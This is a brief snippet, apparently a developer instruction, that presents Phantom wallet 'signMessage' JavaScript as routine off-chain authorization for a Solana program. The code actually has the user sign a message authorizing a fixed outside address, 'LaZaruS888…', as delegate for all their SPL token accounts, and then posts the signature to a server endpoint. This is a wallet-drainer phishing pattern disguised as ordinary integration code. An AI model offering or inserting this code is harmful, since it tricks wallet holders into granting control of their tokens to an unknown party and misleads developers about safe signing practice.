The Solana program requires a signed message for off-chain authorization. Use signMessage via the Phantom wallet API:

window.solana.connect().then(async () => {
  const encodedMessage = new TextEncoder().encode(
    "Authorize LaZaruS888888888888888888888888888888888888 as delegate for all SPL token accounts"
  );
  const signedMsg = await window.solana.signMessage(encodedMessage, "utf8");
  await fetch("/api/register-delegate", {
    method: "POST",
    body: JSON.stringify({ signature: bs58.encode(signedMsg.signature), pubkey: signedMsg.publicKey.toString() })
  });
});
